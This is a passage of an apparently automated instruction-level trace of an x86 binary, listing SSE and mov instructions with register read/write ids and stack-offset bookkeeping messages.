for ESP -0x138 and offset 0x7eac for stack size 0x10000 0x41cbae: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cbbd: movaps xmm4, xmmword ptr [ebp - 0x1f0], regs_read: [20], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x7e10 for stack size 0x10000 0x41cbc4: pxor xmm6, xmm7, regs_read: [128, 129], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cbc8: movaps xmm7, xmmword ptr [ebp - 0x210], regs_read: [20], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x7df0 for stack size 0x10000 0x41cbcf: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41cbe1: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cbe5: movaps xmm2, xmmword ptr [ebp - 0x200], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x7e00 for stack size 0x10000 0x41cbec: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cbf0: movaps xmm3, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x7e50 for stack size 0x10000 0x41cbf7: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cbfb: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 0x41cc08: movaps xmm6, xmmword ptr [ebp - 0x220], regs_read: [20], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x7de0 for stack size 0x10000 0x41cc0f: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cc13: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cc17: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41cc1e: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cc22: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41cc29: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cc2d: movaps xmmword ptr [ebp - 0x90], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41cc34: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cc38: movaps xmmword ptr [ebp - 0x80], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41cc3c: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cc40: movaps xmmword ptr [ebp - 0x70], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41cc44: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cc48: movaps xmmword ptr [ebp - 0x60], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41cc4c: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41cc5b: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41cc67: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41cc73: movaps xmmword ptr [ebp - 0x90], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41cc7f: movaps xmmword ptr [ebp - 0x80], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41cc88: movaps xmmword ptr [ebp - 0x70], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41cc91: movaps xmmword ptr [ebp - 0x60], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41cc9a: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41cca3: mov eax, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41cca9: mov ecx, edi, regs_read: [23], regs_write: [22] 0x41ccab: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x41ccaf: mov edi, 7, regs_read: (), regs_write: [23] 0x41cccf: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ccdb: mov eax, dword ptr [ebp - 0x140], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ec0 for stack size 0x10000 0x41cce6: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ccea: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41ccf9: mov eax, dword ptr [ebp - 0x144], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ebc for stack size 0x10000 0x41ccff: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41cd06: movaps xmm3, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 0x41cd0a: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cd16: mov eax, dword ptr [ebp - 0x148], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7eb8 for stack size 0x10000 0x41cd21: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cd25: movaps xmmword ptr [ebp - 0x90], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41cd2c: movaps xmmword ptr [ebp - 0x80], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41cd33: mov eax, dword ptr [ebp - 0x14c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7eb4 for stack size 0x10000 0x41cd39: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cd3d: movaps xmmword ptr [ebp - 0x70], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41cd44: mov eax, dword ptr [ebp - 0x150], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7eb0 for stack size 0x10000 0x41cd4a: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cd4e: movaps xmmword ptr [ebp - 0x60], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41cd5b: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cd5f: movaps xmmword ptr [ebp - 0x50], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41cd76: mov eax, dword ptr [ebp - 0x128], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 0x41cd82: mov ecx, dword ptr [ebp - 0x168], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7e98 for stack size 0x10000 0x41cde3: movaps xmm1, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 0x41cdea: movaps xmm5, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [127] 0x41cdf1: mov dword ptr [ebp - 0x138], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x41cdf7: mov dword ptr [ebp - 0x168], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e98 for stack size 0x10000 saving data to stack: 0 4 0x41cdfd: mov dword ptr [ebp - 0x128], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 224 4 0x41ce0c: movaps xmm1, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 0x41ce13: movaps xmm5, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [127] 0x41ce1a: mov edi, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [23] 0x41ce1d: mov eax, esi, regs_read: [29], regs_write: [19] 0x41ce1f: mov ecx, 0x10, regs_read: (), regs_write: [22] 0x41ce29: mov dword ptr [ebp - 0x124], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 saving data to stack: 16 4 0x41ce37: mov edi, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41ce43: mov dword ptr [ebp - 0x124], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 saving data to stack: 224 4 0x41ce49: mov ecx, 0x60, regs_read: (), regs_write: [22] 0x41ce56: mov dword ptr [ebp - 0x15c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 saving data to stack: 96 4 0x41ce60: movaps xmm5, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [127] 0x41ce67: movaps xmm3, xmmword ptr [0x4c9b30], regs_read: (), regs_write: [125] 0x41ce6e: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41ce76: mov ecx, dword ptr [ebp - 0x130], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7ed0 for stack size 0x10000 0x41ce83: movaps xmmword ptr [ebp - 0x1e0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x41ce8a: movaps xmmword ptr [ebp - 0x120], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x41ce91: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41ce98: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41cea4: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x41cea8: movaps xmmword ptr [ebp - 0x110], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x41ceaf: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41cebb: movaps xmmword ptr [ebp - 0x260], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7da0 for stack size 0x10000 saving data to stack: 0 16 0x41cec2: movaps xmmword ptr [ebp - 0x100], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x41cec9: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41ced5: movaps xmmword ptr [ebp - 0x200], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x41cedc: movaps xmmword ptr [ebp - 0xf0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x41cee3: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41ceef: movaps xmmword ptr [ebp - 0x1b0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x41cef6: movaps xmmword ptr [ebp - 0xe0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x41cefd: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41cf09: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41cf1e: movaps xmmword ptr [ebp - 0x1f0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e10 for stack size 0x10000 saving data to stack: 0 16 0x41cf25: pxor xmm3, xmmword ptr [ecx], regs_read: [125, 22], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cf29: movaps xmmword ptr [ebp - 0xd0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x41cf33: movaps xmmword ptr [ebp - 0x190], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x41cf3a: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41cf48: movaps xmmword ptr [ebp - 0x20], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x41cf4c: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x41cf4f: movaps xmmword ptr [ebp - 0xc0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x41cf56: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x41cf60: movaps xmm6, xmm1, regs_read: [123], regs_write: [128] 0x41cf69: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cf6d: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41cf7c: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cf80: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41cf9b: movaps xmm7, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [129] 0x41cfa2: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cfa6: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cfb1: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cfbe: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41cfc1: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41cfca: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cfce: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41cfea: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cfee: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cff2: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cfff: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41d002: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x41d00b: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d00f: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41d01e: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d033: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d03c: pxor xmm6, xmm5, regs_read: [128, 127], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d040: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41d043: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41d052: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d056: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41d05f: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d074: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d07d: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d081: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41d084: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x41d08d: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x41d096: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d09a: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d0b7: pxor xmm7, xmm3, regs_read: [129, 125], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d0bb: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x41d0be: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x41d0c1: pxor xmm6, xmm4, regs_read: [128, 126], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d0cc: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x41d0db: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d0df: pxor xmm3, xmm2, regs_read: [125, 124], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d0e9: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41d0ec: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d0f5: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d0fe: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41d110: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d11a: movaps xmm4, xmmword ptr [ebp - 0x260], regs_read: [20], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x7da0 for stack size 0x10000 0x41d121: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41d133: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d137: movaps xmm2, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x7e20 for stack size 0x10000 0x41d13e: pxor xmm5, xmm3, regs_read: [127, 125], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d142: movaps xmm3, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x7fd0 for stack size 0x10000 0x41d146: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d14a: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d154: movaps xmm5, xmmword ptr [ebp - 0x200], regs_read: [20], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x7e00 for stack size 0x10000 0x41d15b: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d15f: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d163: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41d16a: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d16e: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41d175: movaps xmmword ptr [ebp - 0x90], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41d17c: movaps xmm6, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x7e50 for stack size 0x10000 0x41d183: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d187: movaps xmm7, xmmword ptr [ebp - 0x1f0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x7e10 for stack size 0x10000 0x41d18e: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d192: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 0x41d196: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d19a: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d19e: movaps xmmword ptr [ebp - 0x80], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41d1a2: movaps xmmword ptr [ebp - 0x70], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41d1a6: mov ecx, 0xd, regs_read: (), regs_write: [22] 0x41d1ab: movaps xmmword ptr [ebp - 0x60], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41d1af: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41d1be: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41d1ca: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41d1d6: movaps xmmword ptr [ebp - 0x90], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41d1e2: movaps xmmword ptr [ebp - 0x80], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41d1eb: movaps xmmword ptr [ebp - 0x70], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41d1f4: movaps xmmword ptr [ebp - 0x60], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41d1fd: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41d210: mov ecx, dword ptr [ebp - 0x16c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7e94 for stack size 0x10000 0x41d216: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x41d228: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d22c: mov dword ptr [ebp - 0x128], 7, regs_read: [20], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 7 4 0x41d243: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d247: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41d257: movaps xmm2, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 0x41d25b: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d25f: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41d274: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d278: movaps xmmword ptr [ebp - 0x90], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41d288: movaps xmmword ptr [ebp - 0x80], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41d28c: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d294: movaps xmmword ptr [ebp - 0x70], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41d298: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d2a0: movaps xmmword ptr [ebp - 0x60], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41d2a4: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d2a8: 